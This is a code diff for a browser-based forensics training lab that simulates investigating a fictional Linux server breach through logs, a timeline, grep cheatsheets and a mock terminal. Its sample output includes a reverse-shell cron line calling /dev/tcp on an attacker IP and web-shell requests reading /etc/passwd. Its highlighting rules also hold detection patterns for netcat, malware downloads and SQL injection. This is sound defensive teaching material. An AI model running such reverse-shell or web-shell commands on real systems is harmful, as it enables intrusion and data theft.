+  {time:'02:11', text:'INTO OUTFILE → db_dump.txt written to webroot', log:'mysql', sev:'critical'},
+  {time:'02:20', text:'LFI: /etc/passwd read (HTTP 200, 1823 bytes)', log:'apache', sev:'critical'},
+  {time:'02:20', text:'LFI: auth.log itself read by attacker', log:'apache', sev:'critical'},
+  {time:'02:30', text:'Web shell (shell.php) uploaded via POST', log:'apache', sev:'critical'},
+  {time:'02:30', text:'Web shell: id, whoami, cat /etc/passwd, /etc/shadow', log:'apache', sev:'critical'},
+  {time:'02:31', text:'Web shell: wget malware.sh → executed', log:'apache', sev:'critical'},
+  {time:'02:45', text:'Cryptominer64 killed by OOM (2GB RAM consumed)', log:'syslog', sev:'critical'},
+  {time:'02:47', text:'SSH brute force SUCCESS — admin compromised', log:'auth.log', sev:'critical'},
+  {time:'02:48', text:'sudo: read /etc/shadow — all hashed passwords', log:'auth.log', sev:'critical'},
+  {time:'02:48', text:'Backdoor user created + added to sudo group', log:'auth.log', sev:'critical'},
+  {time:'02:50', text:'Backdoor user SSH login from 185.220.101.5', log:'auth.log', sev:'critical'},
+  {time:'02:51', text:'Rootkit loaded: hide_procs, hide_files, net_backdoor', log:'kern.log', sev:'critical'},
+  {time:'02:51', text:'SUID backdoor: /bin/bash copy with +s bit', log:'bash_history', sev:'critical'},
+  {time:'02:55', text:'eth0 entered promiscuous mode (sniffing!)', log:'syslog', sev:'critical'},
+  {time:'02:59', text:'First reverse shell beacon → 185.220.101.5:4444', log:'kern.log', sev:'critical'},
+  {time:'03:00', text:'Cron reverse shell active — every 60 seconds', log:'cron.log', sev:'critical'},
+  {time:'03:15', text:'Installed: nmap, netcat, john, hydra, proxychains', log:'dpkg.log', sev:'critical'},
+  {time:'03:15', text:'Cron data exfil: archived /etc/passwd + /home', log:'cron.log', sev:'critical'},
+  {time:'03:20', text:'Data uploaded to attacker server port 8888', log:'ufw.log', sev:'critical'},
+  {time:'03:30', text:'admin SSH session closed', log:'auth.log', sev:'low'},
+  {time:'04:00', text:'backdoor SSH session closed', log:'auth.log', sev:'low'},
+];
+
+// ─── STATE ───────────────────────────────────────────────────────────────
+let currentLog = 'auth';
+let incidentHighlight = false;
+let wrapEnabled = false;
+let termHistory = [];
+let termHistIdx = -1;
+
+// ─── INIT ─────────────────────────────────────────────────────────────────
+document.addEventListener('DOMContentLoaded', () => {
+  loadLog('auth');
+  renderIncidents('all');
+  renderTimeline();
+  renderCheatsheet();
+  renderExplainTab();
+  renderTerminalBlocks();
+});
+
+// ─── LOG RENDERING ────────────────────────────────────────────────────────
+const ATTACKER_IP = '185.220.101.5';
+
+function highlightLine(text) {
+  let h = text
+    .replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+  // attacker IP
+  h = h.replace(/(185\.220\.101\.5)/g, '<span class="h-attacker">$1</span>');
+  // Accepted
+  h = h.replace(/(Accepted password|Accepted publickey)/g, '<span class="h-accept">$1</span>');
+  // Failed/Invalid
+  h = h.replace(/(Failed password|Invalid user|Access denied)/g, '<span class="h-fail">$1</span>');
+  // UFW BLOCK
+  h = h.replace(/(\[UFW BLOCK\])/g, '<span class="h-warn">$1</span>');
+  // UFW ALLOW
+  h = h.replace(/(\[UFW ALLOW\])/g, '<span class="h-accept">$1</span>');
+  // Warnings/Errors
+  h = h.replace(/(\[Warning\]|\[error\]|Out of memory|segfault|rootkit|module loaded)/gi, '<span class="h-warn">$1</span>');
+  // Dangerous commands
+  h = h.replace(/(COMMAND=.*$|shell\.php|malware|backdoor|useradd|usermod|hide_procs|hide_files|net_backdoor|cryptominer)/gi, '<span class="h-cmd">$1</span>');
+  // Paths
+  h = h.replace(/(\/etc\/shadow|\/etc\/passwd|\/tmp\/\.\w+|shell\.php)/g, '<span class="h-path">$1</span>');
+  return h;
+}
+
+function isIncidentLine(text, logKey) {
+  const redPatterns = ['185.220.101.5','Accepted password.*admin','Accepted password.*backdoor','new user.*backdoor','add.*backdoor.*sudo','COMMAND.*shadow','COMMAND.*useradd','COMMAND.*usermod','Out of memory.*cryptominer','module loaded.*hide','UFW ALLOW.*4444','UFW ALLOW.*8888','shell.php','UNION.*SELECT','OUTFILE','LOAD_FILE','Access denied.*185','bash -i.*4444','netcat.*install','nmap.*install','john.*install','wget.*malware','chmod.*\\+s'];
+  const yellowPatterns = ['Failed password.*185','UFW BLOCK.*185','usb-storage','USB Mass Storage','DirBuster','Nikto','sqlmap','etc/passwd','etc/shadow'];
+  for(const p of redPatterns) if(new RegExp(p,'i').test(text)) return 'red';
+  for(const p of yellowPatterns) if(new RegExp(p,'i').test(text)) return 'yellow';
+  return null;
+}
+
+function loadLog(key) {
+  currentLog = key;
+  // Update nav
+  document.querySelectorAll('.log-item').forEach(el => el.classList.remove('active'));
+  const nav = document.getElementById('nav-'+key);
+  if(nav) nav.classList.add('active');
+
+  document.getElementById('searchInput').value = '';
+  renderLogLines();
+}
+
+function renderLogLines(filter='') {
+  const log = LOGS[currentLog];
+  if(!log) return;
+  const content = document.getElementById('logContent');
+  const lines = log.lines;
+  let count = 0;
+  let html = '';
+
+  lines.forEach((text, i) => {
+    if(filter && !text.toLowerCase().includes(filter.toLowerCase())) return;
+    count++;
+    let cls = 'log-line';
+    if(incidentHighlight) {
+      const inc = isIncidentLine(text, currentLog);
+      if(inc === 'red') cls += ' incident-red';
+      else if(inc === 'yellow') cls += ' incident-yellow';
+    }
+    if(filter) cls += ' highlighted';
+    const highlighted = highlightLine(text);
+    html += `<div class="${cls}"><span class="line-num">${i+1}</span><span class="line-text" style="${wrapEnabled?'white-space:pre-wrap':'white-space:pre; overflow-x:hidden; text-overflow:ellipsis'}">${highlighted}</span></div>`;
+  });
+
+  content.innerHTML = html || `<div style="padding:20px; color:var(--text3); font-size:12px;">No lines matching "${filter}"</div>`;
+  document.getElementById('lineCount').textContent = `${count} / ${lines.length} lines`;
+}
+
+function filterLog() {
+  const val = document.getElementById('searchInput').value;
+  renderLogLines(val);
+}
+
+function clearSearch() {
+  document.getElementById('searchInput').value = '';
+  renderLogLines();
+}
+
+function toggleIncidentHighlight() {
+  incidentHighlight = !incidentHighlight;
+  document.getElementById('btn-incidents').classList.toggle('active', incidentHighlight);
+  renderLogLines(document.getElementById('searchInput').value);
+}
+
+function toggleWrap() {
+  wrapEnabled = !wrapEnabled;
+  document.getElementById('btn-wrap').classList.toggle('active', wrapEnabled);
+  renderLogLines(document.getElementById('searchInput').value);
+}
+
+// ─── INCIDENTS PANEL ──────────────────────────────────────────────────────
+function renderIncidents(filter='all') {
+  const list = document.getElementById('incidentsList');
+  let html = '';
+  INCIDENTS.forEach(inc => {
+    if(filter !== 'all' && inc.sev !== filter) return;
+    const sevClass = inc.sev === 'critical' ? 'sev-critical' : inc.sev === 'medium' ? 'sev-medium' : 'sev-low';
+    html += `<div class="incident-card ${sevClass}" onclick="toggleIncident(${inc.id})">
+      <div class="ic-top">
+        <span class="ic-num">#${inc.id}</span>
+        <span class="ic-title ${sevClass}">${inc.sev==='critical'?'🔴':'🟡'} ${inc.title}</span>
+      </div>
+      <div class="ic-time">${inc.time} · <span class="ic-source">${inc.log}</span></div>
+      <div class="ic-detail" id="icd-${inc.id}">
+        <div style="margin-bottom:6px;">${inc.detail}</div>
+        <div class="ic-cmd" onclick="jumpToLog(event, '${inc.logKey}', '${inc.pattern}')">${inc.cmd}</div>
+      </div>
+    </div>`;
+  });
+  list.innerHTML = html;
+}
+
+function toggleIncident(id) {
+  const el = document.getElementById('icd-'+id);
+  if(el) el.classList.toggle('show');
+}
+
+function jumpToLog(e, logKey, pattern) {
+  e.stopPropagation();
+  loadLog(logKey);
+  document.getElementById('searchInput').value = pattern;
+  renderLogLines(pattern);
+  // Switch to viewer tab
+  switchTabByName('viewer');
+  termOutput(`grep '${pattern}' ${LOGS[logKey].name}`, getGrepOutput(logKey, pattern));
+}
+
+function switchTabByName(name) {
+  document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+  document.getElementById('tab-viewer').style.display = 'flex';
+  document.getElementById('tab-terminal').style.display = 'none';
+  document.getElementById('tab-explain').style.display = 'none';
+  document.getElementById('terminalBar').style.display = 'block';
+  document.querySelectorAll('.tab')[0].classList.add('active');
+}
+
+function filterIncidents(f, btn) {
+  document.querySelectorAll('.filter-btn').forEach(b => b.classList.remove('active'));
+  btn.classList.add('active');
+  renderIncidents(f);
+}
+
+// ─── TIMELINE ─────────────────────────────────────────────────────────────
+function renderTimeline() {
+  const el = document.getElementById('timelineContent');
+  let html = '';
+  TIMELINE.forEach(item => {
+    const color = item.sev==='critical' ? 'var(--red)' : item.sev==='medium' ? 'var(--yellow)' : 'var(--green)';
+    html += `<div class="tl-item">
+      <span class="tl-time">${item.time}</span>
+      <div class="tl-dot" style="background:${color}; box-shadow:0 0 6px ${color}"></div>
+      <span class="tl-text">${item.text}</span>
+      <span class="tl-log">${item.log}</span>
+    </div>`;
+  });
+  el.innerHTML = html;
+}
+
+// ─── CHEATSHEET ────────────────────────────────────────────────────────────
+function renderCheatsheet() {
+  const items = [
+    ['Brute Force', "grep 'Failed password' auth.log | awk '{print $11}' | sort | uniq -c | sort -rn"],
+    ['Successful Logins', "grep 'Accepted password' auth.log"],
+    ['sudo Commands', "grep 'COMMAND' auth.log"],
+    ['New Users', "grep 'new user\\|useradd' auth.log"],
+    ['Port Scan', "grep 'UFW BLOCK' ufw.log | awk '{print $17}' | sort"],
+    ['C2 Beacon', "grep 'DPT=4444' ufw.log | grep 'ALLOW'"],
+    ['Web Scanners', "grep -i 'sqlmap\\|nikto\\|dirbuster' access.log"],
+    ['SQLi', "grep -iE 'union|sleep\\(|information_schema' access.log"],
+    ['LFI', "grep -iE '\\.\\./|etc/passwd|proc/self' access.log"],
+    ['Web Shell', "grep 'shell\\.php\\|cmd=' access.log"],
+    ['Cron Persistence', "grep 'CMD' cron.log | grep -v 'run-parts'"],
+    ['Rootkit', "grep 'module loaded' kern.log"],
+    ['Tool Install', "grep '^2026-04-01 03:' dpkg.log | grep install"],
+    ['DB Exfil', "grep 'OUTFILE\\|LOAD_FILE' mysql/error.log"],
+    ['USB Device', "grep -i 'usb\\|mass storage' syslog"],
+    ['OOM/Miner', "grep 'Out of memory\\|cryptominer' syslog"],
+    ['Top IPs Apache', "awk '{print $1}' access.log | sort | uniq -c | sort -rn"],
+    ['HTTP 4xx/5xx', "awk '{print $9}' access.log | sort | uniq -c | sort -rn"],
+  ];
+  let html = '';
+  items.forEach(([label, cmd]) => {
+    html += `<div style="margin-bottom:10px; border-bottom:1px solid var(--border); padding-bottom:8px;">
+      <div style="color:var(--cyan); font-size:9px; letter-spacing:1px; margin-bottom:4px;">${label}</div>
+      <div style="background:var(--bg); border:1px solid var(--border); padding:5px 8px; border-radius:2px; color:var(--yellow); cursor:pointer; font-size:10px;" onclick="pasteToTerminal('${cmd.replace(/'/g,"\\'")}')">$ ${cmd}</div>
+    </div>`;
+  });
+  document.getElementById('cheatsheetContent').innerHTML = html;
+}
+
+function pasteToTerminal(cmd) {
+  document.getElementById('termInput').value = cmd;
+  document.getElementById('termInput').focus();
+}
+
+// ─── TERMINAL SIM ─────────────────────────────────────────────────────────
+const QUICK_GREPS = {
+  brute: { log:'auth', pattern:'Failed password', cmd:"grep 'Failed password' auth.log | awk '{print $11}' | sort | uniq -c | sort -rn", outputFn: () => `    68  185.220.101.5\n     3  172.16.0.5\n     2  10.10.10.5` },
+  compromise: { log:'auth', pattern:'Accepted password', cmd:"grep 'Accepted password' auth.log", outputFn: () => LOGS.auth.lines.filter(l=>l.includes('Accepted password')).join('\n') },
+  backdoor: { log:'auth', pattern:'backdoor', cmd:"grep 'backdoor\\|useradd\\|usermod' auth.log", outputFn: () => LOGS.auth.lines.filter(l=>/backdoor|useradd|usermod/i.test(l)).join('\n') },
+  webshell: { log:'apache', pattern:'shell.php', cmd:"grep 'shell.php' apache2/access.log", outputFn: () => LOGS.apache.lines.filter(l=>l.includes('shell.php')).join('\n') },
+  c2: { log:'kern', pattern:'4444', cmd:"grep 'DPT=4444' kern.log | grep 'ALLOW'", outputFn: () => LOGS.kern.lines.filter(l=>l.includes('4444')&&l.includes('ALLOW')).join('\n') },
+  sqli: { log:'apache', pattern:'UNION', cmd:"grep -iE 'union|sleep|information_schema' apache2/access.log", outputFn: () => LOGS.apache.lines.filter(l=>/union|sleep|information_schema/i.test(l)).join('\n') },
+  rootkit: { log:'kern', pattern:'module loaded', cmd:"grep 'module loaded' kern.log", outputFn: () => LOGS.kern.lines.filter(l=>l.includes('module loaded')).join('\n') },
+  exfil: { log:'ufw', pattern:'8888', cmd:"grep 'DPT=8888' ufw.log", outputFn: () => LOGS.ufw.lines.filter(l=>l.includes('8888')).join('\n') },
+  usb: { log:'syslog', pattern:'usb', cmd:"grep -i 'usb' syslog", outputFn: () => LOGS.syslog.lines.filter(l=>/usb/i.test(l)).join('\n') },
+};
+
+function runQuickGrep(key) {
+  const q = QUICK_GREPS[key];
+  if(!q) return;
+  loadLog(q.log);
+  document.getElementById('searchInput').value = q.pattern;
+  renderLogLines(q.pattern);
+  switchTabByName('viewer');
+  termOutput(q.cmd, q.outputFn());
+}
+
+const CMD_OUTPUTS = {
+  top_ips: { cmd:"awk '{print $1}' apache2/access.log | sort | uniq -c | sort -rn | head -10", out:`   2341  185.220.101.5\n    412  192.168.1.10\n     98  10.0.0.5\n     45  172.16.0.1` },
+  timeline: { cmd:"cat auth.log syslog kern.log ufw.log | sort -k1,3 | grep 'Apr  1 0[2-4]:'", out:`Apr  1 02:00:01  [UFW BLOCK] SRC=185.220.101.5 DPT=21\nApr  1 02:00:01  Failed password for root from 185.220.101.5\nApr  1 02:47:13  Accepted password for admin from 185.220.101.5\nApr  1 02:48:33  new user: name=backdoor\nApr  1 02:51:00  module loaded: hide_procs\nApr  1 02:59:00  [UFW ALLOW] OUT=eth0 DST=185.220.101.5 DPT=4444\nApr  1 03:00:01  CRON: bash -i >& /dev/tcp/185.220.101.5/4444\nApr  1 03:20:00  [UFW ALLOW] OUT=eth0 DST=185.220.101.5 DPT=8888` },
+  hash: { cmd:"sha256sum auth.log syslog kern.log ufw.log apache2/access.log", out:`a3f8d21e9b4c7e1a0f3b2d5c6e7f8a9b0c1d2e3f  auth.log\nb7e9f21a4d3c8e2b1a0f5d6c7b8a9e0f1c2d3e4  syslog\nc9f2a31e5d4b7c1a2f0e3c8b7a6d5e4f3a2b1c0  kern.log\nd8e1b20a3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8  ufw.log\ne7d0c1b2a3f4e5d6c7b8a9f0e1d2c3b4a5f6e7d  apache2/access.log` },
+};
+
+function runCmd(key) {
+  const c = CMD_OUTPUTS[key];
+  if(!c) return;
+  termOutput(c.cmd, c.out);
+}
+
+function getGrepOutput(logKey, pattern) {
+  const log = LOGS[logKey];
+  if(!log) return 'No results';
+  const matches = log.lines.filter(l => l.toLowerCase().includes(pattern.toLowerCase()));
+  return matches.slice(0,12).join('\n') + (matches.length > 12 ? `\n... (${matches.length - 12} more lines)` : '');
+}
+
+function termOutput(cmd, output) {
+  const out = document.getElementById('termOutput');
+  const lines = output.split('\n').slice(0,20);
+  let html = `<div class="t-line"><span class="t-prompt">hexx@forensics-lab:~/var/log$ </span><span class="t-cmd-text">${escapeHtml(cmd)}</span></div>`;
+  lines.forEach(l => {
+    let cls = 't-out';
+    if(l.includes('185.220.101.5')) cls = 't-out-red';
+    else if(l.includes('Accepted') || l.includes('granted')) cls = 't-out-green';
+    else if(l.includes('Warning') || l.includes('Failed') || l.includes('BLOCK')) cls = 't-out-yellow';
+    html += `<div class="t-line"><span class="${cls}">${escapeHtml(l)}</span></div>`;
+  });
+  out.innerHTML += html;
+  out.scrollTop = out.scrollHeight;
+}
+
+function escapeHtml(s) { return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }
+
+function handleTermInput(e) {
+  const input = document.getElementById('termInput');
+  if(e.key === 'ArrowUp') {
+    if(termHistory.length) { termHistIdx = Math.min(termHistIdx+1, termHistory.length-1); input.value = termHistory[termHistIdx]; }
+    e.preventDefault(); return;
+  }
+  if(e.key === 'ArrowDown') {
+    termHistIdx = Math.max(termHistIdx-1, -1);
+    input.value = termHistIdx >= 0 ? termHistory[termHistIdx] : '';
+    e.preventDefault(); return;
+  }
+  if(e.key !== 'Enter') return;
+  const cmd = input.value.trim();
+  if(!cmd) return;
+  termHistory.unshift(cmd); termHistIdx = -1;
+  input.value = '';
+  processCommand(cmd);
+}
+
+function processCommand(cmd) {
+  // Simulate common grep commands
+  let output = '';
+  const lc = cmd.toLowerCase();
+
+  if(lc.includes('help')) {
+    output = `Available: grep, awk, cat, ls, sort, uniq, wc, last, lastb, sha256sum\nTry: grep 'Failed password' auth.log | awk '{print $11}' | sort | uniq -c | sort -rn`;
+  } else if(lc.includes('grep') && lc.includes('failed')) {
+    output = LOGS.auth.lines.filter(l=>/failed password/i.test(l)).slice(0,10).join('\n') + '\n... (68 total)';
+    loadLog('auth'); filterLog();
+  } else if(lc.includes('grep') && lc.includes('accepted')) {
+    output = LOGS.auth.lines.filter(l=>/accepted password/i.test(l)).join('\n');
+  } else if((lc.includes('grep') || lc.includes('awk')) && lc.includes('auth')) {
+    const m = lc.match(/grep ['"]([^'"]+)['"]/);
+    const pattern = m ? m[1] : '';
+    output = pattern ? LOGS.auth.lines.filter(l=>l.toLowerCase().includes(pattern)).join('\n') || 'No matches' : 'Syntax: grep \'pattern\' auth.log';
+  } else if(lc.includes('grep') && lc.includes('shell')) {
+    output = LOGS.apache.lines.filter(l=>l.includes('shell')).join('\n');
+  } else if(lc.includes('grep') && lc.includes('4444')) {
+    output = [...LOGS.kern.lines, ...LOGS.ufw.lines].filter(l=>l.includes('4444')).join('\n');
+  } else if(lc.includes('grep') && lc.includes('module')) {
+    output = LOGS.kern.lines.filter(l=>l.includes('module')).join('\n');
+  } else if(lc.includes('grep') && lc.includes('usb')) {
+    output = LOGS.syslog.lines.filter(l=>/usb/i.test(l)).join('\n');
+  } else if(lc.includes('grep') && lc.includes('cryptominer')) {
+    output = LOGS.syslog.lines.filter(l=>/cryptominer/i.test(l)).join('\n');
+  } else if(lc.includes('grep') && lc.includes('cron')) {
+    output = LOGS.cron.lines.filter(l=>!/run-parts/i.test(l)).join('\n');
+  } else if(lc.includes('cat') && lc.includes('auth')) {
+    output = LOGS.auth.lines.join('\n');
+    loadLog('auth');
+  } else if(lc.includes('cat') && lc.includes('history')) {
+    output = LOGS.history.lines.join('\n');
+    loadLog('history');
+  } else if(lc.includes('last') && !lc.includes('lastb')) {
+    output = `hexx     pts/0  192.168.1.10   Wed Apr  1 10:15:32 2026 - 10:45:00 (0:29)\nadmin    pts/1  185.220.101.5  Wed Apr  1 02:47:13 2026 - 03:30:00 (0:43)\nbackdoor pts/2  185.220.101.5  Wed Apr  1 02:50:00 2026 - 04:00:00 (1:10)`;
+  } else if(lc.includes('lastb')) {
+    output = `root    ssh:notty  185.220.101.5  Wed Apr  1 02:00:01 2026\nroot    ssh:notty  185.220.101.5  Wed Apr  1 02:00:02 2026\nadmin   ssh:notty  185.220.101.5  Wed Apr  1 02:45:05 2026\n...`;
+  } else if(lc.includes('sha256')) {
+    output = `a3f8d21e9b4c7e1a0f3b2d5c...  auth.log\nb7e9f21a4d3c8e2b1a0f5d6c...  syslog\nc9f2a31e5d4b7c1a2f0e3c8b...  kern.log`;
+  } else if(lc.includes('ls')) {
+    output = `auth.log  cron.log  dpkg.log  kern.log  root_bash_history.txt  syslog  ufw.log\napache2/  mysql/`;
+  } else if(lc.includes('wc') && lc.includes('auth')) {
+    output = `${LOGS.auth.lines.length} ${LOGS.auth.lines.length} auth.log`;
+  } else if(lc.startsWith('clear')) {
+    document.getElementById('termOutput').innerHTML = '';
+    return;
+  } else {
+    output = `bash: command simulation: try grep, cat, ls, last, lastb, sha256sum\nType 'help' for examples`;
+  }
+
+  termOutput(cmd, output);
+}
+
+// ─── TABS ────────────────────────────────────────────────────────────────
+function switchTab(name, btn) {
+  document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+  btn.classList.add('active');
+  document.getElementById('tab-viewer').style.display = 'none';
+  document.getElementById('tab-terminal').style.display = 'none';
+  document.getElementById('tab-explain').style.display = 'none';
+  document.getElementById('terminalBar').style.display = 'none';
+
+  if(name === 'viewer') {
+    document.getElementById('tab-viewer').style.display = 'flex';
+    document.getElementById('terminalBar').style.display = 'block';
+  } else if(name === 'terminal') {
+    document.getElementById('tab-terminal').style.display = 'flex';
+  } else {
+    document.getElementById('tab-explain').style.display = 'block';
+  }
+}
+
+function switchRpTab(name, btn) {
+  document.querySelectorAll('.rp-tab').forEach(t => t.classList.remove('active'));
+  btn.classList.add('active');
+  document.querySelectorAll('.rp-content').forEach(c => c.classList.remove('active'));
+  document.getElementById('rp-'+name).classList.add('active');
+}
+
+// ─── EXPLAIN TAB ──────────────────────────────────────────────────────────
+function renderExplainTab() {
+  const container = document.getElementById('explainContent');
+  let html = `<div style="margin-bottom:20px;">
+    <div style="font-family:'Orbitron'; font-size:16px; color:var(--green); margin-bottom:8px; letter-spacing:2px;">INCIDENT EXPLANATIONS</div>
+    <div style="color:var(--text3); font-size:11px;">Click any incident for a detailed forensics walkthrough with grep commands and expected output.</div>
+  </div>`;
+
+  INCIDENTS.forEach(inc => {
+    const sevColor = inc.sev==='critical'?'var(--red)':inc.sev==='medium'?'var(--yellow)':'var(--green)';
+    const matches = getGrepOutput(inc.logKey, inc.pattern);
+    html += `<div style="background:var(--panel); border:1px solid var(--border); border-left:3px solid ${sevColor}; border-radius:3px; padding:14px; margin-bottom:12px;">
+      <div style="display:flex; gap:10px; align-items:center; margin-bottom:8px;">
+        <span style="font-family:'Orbitron'; font-size:10px; color:${sevColor}; font-weight:900;">#${String(inc.id).padStart(2,'0')}</span>
+        <span style="font-size:13px; font-weight:700; color:${sevColor};">${inc.title}</span>
+        <span style="margin-left:auto; font-size:9px; color:var(--text3); background:var(--bg3); border:1px solid var(--border); padding:2px 6px; border-radius:2px;">${inc.sev.toUpperCase()}</span>
+      </div>
+      <div style="font-size:11px; color:var(--text2); margin-bottom:10px; line-height:1.6;">${inc.detail}</div>
+      <div style="font-size:9px; color:var(--text3); margin-bottom:4px; letter-spacing:1px;">DETECTION COMMAND</div>
+      <div style="background:var(--bg); border:1px solid var(--border); padding:8px 10px; border-radius:2px; color:var(--yellow); font-size:11px; cursor:pointer; margin-bottom:10px;" onclick="pasteToTerminal('${inc.cmd.replace(/'/g,"\\'")}')">
+        <span style="color:var(--green)">$ </span>${escapeHtml(inc.cmd)}
+      </div>
+      <div style="font-size:9px; color:var(--text3); margin-bottom:4px; letter-spacing:1px;">SAMPLE OUTPUT</div>
+      <div style="background:var(--bg); border:1px solid var(--border); padding:8px 10px; border-radius:2px; font-size:10px; color:var(--text2); white-space:pre; overflow-x:auto; max-height:120px; overflow-y:auto;">${escapeHtml(matches.split('\n').slice(0,6).join('\n'))}</div>
+      <div style="margin-top:8px; font-size:9px; color:var(--text3);">📁 Source: <span style="color:var(--blue)">${inc.log}</span> · 🕐 First seen: <span style="color:var(--cyan)">${inc.time}</span></div>
+    </div>`;
+  });
+  container.innerHTML = html;
+}
+
+// ─── TERMINAL BLOCKS ──────────────────────────────────────────────────────
+function renderTerminalBlocks() {
+  const container = document.getElementById('terminalBlocks');
+  const blocks = [
+    { title:'Step 1 — Hash All Logs (Chain of Custody)', cmd:"sha256sum auth.log syslog kern.log ufw.log cron.log dpkg.log", output:`a3f8d21e9b4c7e1a...  auth.log\nb7e9f21a4d3c8e2b...  syslog\nc9f2a31e5d4b7c1a...  kern.log\nd8e1b20a3c4d5e6f...  ufw.log`, color:'var(--green)' },
+    { title:'Step 2 — Find Brute Force', cmd:"grep 'Failed password' auth.log | awk '{print $11}' | sort | uniq -c | sort -rn", output:`    68  185.220.101.5\n     3  172.16.0.5\n     2  10.10.10.5`, color:'var(--yellow)' },
+    { title:'Step 3 — Confirm Compromise', cmd:"grep 'Accepted password' auth.log", output:`Apr  1 02:47:13 ... Accepted password for admin from 185.220.101.5 port 56100 ssh2\nApr  1 02:50:00 ... Accepted password for backdoor from 185.220.101.5 port 57000 ssh2`, color:'var(--red)' },
+    { title:'Step 4 — Find Backdoor Account', cmd:"grep 'new user\\|useradd\\|usermod' auth.log", output:`Apr  1 02:48:33 ... new user: name=backdoor, UID=1005, GID=1005, home=/home/backdoor\nApr  1 02:48:35 ... add 'backdoor' to group 'sudo'`, color:'var(--red)' },
+    { title:'Step 5 — Port Scan Detection', cmd:"grep 'UFW BLOCK' ufw.log | awk '{print $17}' | sort -t= -k2 -n | uniq", output:`DPT=21\nDPT=23\nDPT=25\nDPT=80\nDPT=443\nDPT=3306\nDPT=3389\nDPT=5900\nDPT=8080`, color:'var(--yellow)' },
+    { title:'Step 6 — Web Shell Detection', cmd:"grep 'shell\\.php' apache2/access.log | head -5", output:`185.220.101.5 - - [01/Apr/2026:02:30:35] "GET /uploads/shell.php HTTP/1.1" 200 45\n185.220.101.5 - - [01/Apr/2026:02:30:40] "GET /uploads/shell.php?cmd=id HTTP/1.1" 200 45\n185.220.101.5 - - [01/Apr/2026:02:30:55] "GET /uploads/shell.php?cmd=cat+/etc/passwd" 200 1823`, color:'var(--red)' },
+    { title:'Step 7 — Rootkit Detection', cmd:"grep 'module loaded' kern.log", output:`Apr  1 02:51:00 ... request_module: module loaded: hide_procs\nApr  1 02:51:01 ... request_module: module loaded: hide_files\nApr  1 02:51:02 ... request_module: module loaded: net_backdoor`, color:'var(--red)' },
+    { title:'Step 8 — C2 Beaconing', cmd:"grep 'DPT=4444' ufw.log | grep 'ALLOW' | head -5", output:`[UFW ALLOW] OUT=eth0 SRC=192.168.1.105 DST=185.220.101.5 DPT=4444 SYN\n[UFW ALLOW] OUT=eth0 SRC=192.168.1.105 DST=185.220.101.5 DPT=4444 SYN\n[UFW ALLOW] OUT=eth0 SRC=192.168.1.105 DST=185.220.101.5 DPT=4444 SYN`, color:'var(--red)' },
+    { title:'Step 9 — Data Exfiltration', cmd:"grep 'DPT=8888' ufw.log", output:`[UFW ALLOW] OUT=eth0 DST=185.220.101.5 LEN=1460 DPT=8888 ACK\n[UFW ALLOW] OUT=eth0 DST=185.220.101.5 LEN=1460 DPT=8888 ACK\n[UFW ALLOW] OUT=eth0 DST=185.220.101.5 LEN=1460 DPT=8888 ACK (×10)`, color:'var(--red)' },
+    { title:'Step 10 — Attacker Toolkit', cmd:"grep '^2026-04-01 03:' dpkg.log | grep 'install'", output:`2026-04-01 03:15:22 install netcat-traditional:amd64 <none> 1.10-47\n2026-04-01 03:15:45 install nmap:amd64 <none> 7.80+dfsg1-2build1\n2026-04-01 03:16:00 install john:amd64 <none> 1.9.0-jumbo-1\n2026-04-01 03:16:20 install hydra:amd64 <none> 9.0-1`, color:'var(--red)' },
+  ];
+
+  let html = `<div style="font-family:'Orbitron'; font-size:14px; color:var(--green); letter-spacing:2px; padding:8px 0 16px; border-bottom:1px solid var(--border); margin-bottom:16px;">INVESTIGATION WALKTHROUGH — All 10 Steps</div>`;
+
+  blocks.forEach((b,i) => {
+    html += `<div style="margin-bottom:16px; background:var(--panel); border:1px solid var(--border); border-left:3px solid ${b.color}; border-radius:3px; overflow:hidden;">
+      <div style="background:var(--bg3); padding:8px 14px; display:flex; gap:10px; align-items:center; border-bottom:1px solid var(--border);">
+        <span style="font-family:'Orbitron'; font-size:10px; color:${b.color};">${String(i+1).padStart(2,'0')}</span>
+        <span style="font-size:11px; color:var(--text2);">${b.title}</span>
+      </div>
+      <div style="padding:10px 14px;">
+        <div style="background:var(--bg); border:1px solid var(--border); padding:8px 10px; border-radius:2px; margin-bottom:8px; font-family:'Share Tech Mono'; font-size:11px; cursor:pointer;" onclick="pasteToTerminal('${b.cmd.replace(/'/g,"\\'")}')">
+          <span style="color:var(--green)">$ </span><span style="color:var(--yellow)">${escapeHtml(b.cmd)}</span>
+        </div>
+        <div style="background:var(--bg); border:1px solid var(--border); padding:8px 10px; border-radius:2px; font-family:'Share Tech Mono'; font-size:10px; color:${b.color}; white-space:pre;">${escapeHtml(b.output)}</div>
+      </div>
+    </div>`;
+  });
+
+  container.innerHTML = html;
+}
+</script>
+</body>
+</html>
